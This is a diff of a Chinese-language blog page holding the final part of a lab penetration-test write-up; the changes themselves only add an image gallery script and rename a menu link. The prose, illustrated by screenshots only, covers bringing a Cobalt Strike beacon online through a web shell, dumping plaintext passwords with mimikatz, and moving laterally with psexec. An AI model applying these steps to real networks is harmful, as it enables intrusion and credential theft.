+<p><a href="/images/62bf4c041d64b07066ddb7ca.jpg" title="image-20220702025146824" class="gallery-item"><img src="/images/62bf4c041d64b07066ddb7ca.jpg" alt="image-20220702025146824"></a></p>
 <p>至此，MSF正式打完！</p>
 <h2 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h2><h3 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h3><p>利用http listenner生成一个payload，然后放到蚁剑那里去执行以下：</p>
-<p><img src="/images/62bf4c141d64b07066ddc2e7.jpg" alt="image-20220702025559691"></p>
+<p><a href="/images/62bf4c141d64b07066ddc2e7.jpg" title="image-20220702025559691" class="gallery-item"><img src="/images/62bf4c141d64b07066ddc2e7.jpg" alt="image-20220702025559691"></a></p>
 <p>成功上线：</p>
-<p><img src="/images/62bf4c1d1d64b07066ddcaa0.jpg" alt="image-20220702025616044"></p>
+<p><a href="/images/62bf4c1d1d64b07066ddcaa0.jpg" title="image-20220702025616044" class="gallery-item"><img src="/images/62bf4c1d1d64b07066ddcaa0.jpg" alt="image-20220702025616044"></a></p>
 <p>同样的内网信息收集就不在这里再列举了，可以参考MSF收集信息时的步骤。对了，记得使用命令前，设置一下sleep，毕竟是靶机嘛，可以稍微大胆一点。</p>
 <h3 id="内网突破-1"><a href="#内网突破-1" class="headerlink" title="内网突破"></a>内网突破</h3><p>利用CS自带的mimikatz拿到明文密码：</p>
-<p><img src="/images/62bf4c291d64b07066ddd2a8.jpg" alt="image-20220702030022084"></p>
-<p><img src="/images/62bf4c331d64b07066ddda54.jpg" alt="image-20220702030153351"></p>
+<p><a href="/images/62bf4c291d64b07066ddd2a8.jpg" title="image-20220702030022084" class="gallery-item"><img src="/images/62bf4c291d64b07066ddd2a8.jpg" alt="image-20220702030022084"></a></p>
+<p><a href="/images/62bf4c331d64b07066ddda54.jpg" title="image-20220702030153351" class="gallery-item"><img src="/images/62bf4c331d64b07066ddda54.jpg" alt="image-20220702030153351"></a></p>
 <p>接着我们可以利用psexec和刚刚得到的密码，与内网中别的主机进行连接：</p>
-<p><img src="/images/62bf4c441d64b07066dde730.jpg" alt="image-20220702030315702"></p>
-<p><img src="/images/62bf4c4f1d64b07066ddefd8.jpg" alt="image-20220702030354739"></p>
+<p><a href="/images/62bf4c441d64b07066dde730.jpg" title="image-20220702030315702" class="gallery-item"><img src="/images/62bf4c441d64b07066dde730.jpg" alt="image-20220702030315702"></a></p>
+<p><a href="/images/62bf4c4f1d64b07066ddefd8.jpg" title="image-20220702030354739" class="gallery-item"><img src="/images/62bf4c4f1d64b07066ddefd8.jpg" alt="image-20220702030354739"></a></p>
 <p>其中监听器设置SMB，会话选择Win7的那台。成功连接：</p>
-<p><img src="/images/62bf4c5e1d64b07066ddfb3b.jpg" alt="image-20220702030441329"></p>
-<p><img src="/images/62bf4c691d64b07066de0731.jpg" alt="image-20220702030453713"></p>
+<p><a href="/images/62bf4c5e1d64b07066ddfb3b.jpg" title="image-20220702030441329" class="gallery-item"><img src="/images/62bf4c5e1d64b07066ddfb3b.jpg" alt="image-20220702030441329"></a></p>
+<p><a href="/images/62bf4c691d64b07066de0731.jpg" title="image-20220702030453713" class="gallery-item"><img src="/images/62bf4c691d64b07066de0731.jpg" alt="image-20220702030453713"></a></p>
 <p>可以看一下文件管理：</p>
-<p><img src="/images/62bf4c721d64b07066de0de2.jpg" alt="image-20220702030519270"></p>
+<p><a href="/images/62bf4c721d64b07066de0de2.jpg" title="image-20220702030519270" class="gallery-item"><img src="/images/62bf4c721d64b07066de0de2.jpg" alt="image-20220702030519270"></a></p>
 <p>另外一台也是同样的方法，成功连接：</p>
-<p><img src="/images/62bf4c7b1d64b07066de149f.jpg" alt="image-20220702030618391"></p>
+<p><a href="/images/62bf4c7b1d64b07066de149f.jpg" title="image-20220702030618391" class="gallery-item"><img src="/images/62bf4c7b1d64b07066de149f.jpg" alt="image-20220702030618391"></a></p>
 <p>顺便利用梼杌插件来个小娱乐：</p>
-<p><img src="/images/62bf4c841d64b07066de1b09.jpg" alt="image-20220702031636250"></p>
-<p><img src="/images/62bf4c8c1d64b07066de20b5.jpg" alt="image-20220702031657035"></p>
+<p><a href="/images/62bf4c841d64b07066de1b09.jpg" title="image-20220702031636250" class="gallery-item"><img src="/images/62bf4c841d64b07066de1b09.jpg" alt="image-20220702031636250"></a></p>
+<p><a href="/images/62bf4c8c1d64b07066de20b5.jpg" title="image-20220702031657035" class="gallery-item"><img src="/images/62bf4c8c1d64b07066de20b5.jpg" alt="image-20220702031657035"></a></p>
 <p>至此，打完，收工！</p>
-
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
   </div>
 </article>
 
@@ -400,7 +405,7 @@
         
           <li><a href="/about/">About</a></li>
         
-          <li><a href="/archives/">Writing</a></li>
+          <li><a href="/archives/">Articles</a></li>
         
           <li><a href="/tags/">tags</a></li>
         
@@ -462,7 +467,7 @@
      --><!--
        --><li><a href="/about/">About</a></li><!--
      --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
+       --><li><a href="/archives/">Articles</a></li><!--
      --><!--
        --><li><a href="/tags/">tags</a></li><!--
      --><!--
